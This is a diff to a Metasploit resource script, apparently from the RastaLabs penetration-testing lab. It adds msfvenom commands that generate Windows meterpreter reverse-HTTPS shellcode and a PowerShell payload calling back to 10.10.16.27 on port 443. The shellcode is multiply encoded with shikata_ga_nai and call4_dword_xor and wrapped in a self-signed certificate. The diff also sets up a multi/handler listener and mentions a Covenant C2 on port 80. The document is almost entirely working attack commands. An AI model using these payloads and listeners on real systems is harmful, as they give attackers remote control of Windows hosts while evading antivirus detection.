@@ -1,10 +1,23 @@
 #msfconsole -r pivot.rc -q
 
+#openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout /tmp/rsaprivate.key -out /tmp/servercertificate.crt
+#cat /tmp/rsaprivate.key /tmp/servercertificate.crt > /root/rastalabs/msf.pem
+
+#msfvenom -p windows/meterpreter/reverse_winhttps LHOST=10.10.16.27 LPORT=443 --platform windows -a x86 HandlerSSLCert=./my.pem StagerVerifySSLCert=true -s 42 --smallest -e x86/shikata_ga_nai -i 9 -f raw| msfvenom --platform windows -a x86 -e x86/call4_dword_xor -i 6 -b "\x00\x0a\x0d" -f raw > shellcode.raw
+
+#msfvenom --payload windows/x64/meterpreter/reverse_winhttp LHOST=tun0 HandlerSSLCert=/root/rastalabs/msf.pem StagerVerifySSLCert=true LPORT=443 -f psh-net -o 443.ps1
+
+
 #SESSION PASS
 spool msf.log
 use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_http
+#set payload windows/x64/meterpreter/reverse_http
+set payload windows/x64/meterpreter/reverse_winhttps
+set HandlerSSLCert /root/rastalabs/msf.pem
+set SessionCommunicationTimeout 600
 set LHOST tun0
+
+#80 is covenant
 set LPORT 443
 set EXITFUNC thread
 set EXITONSESSION false
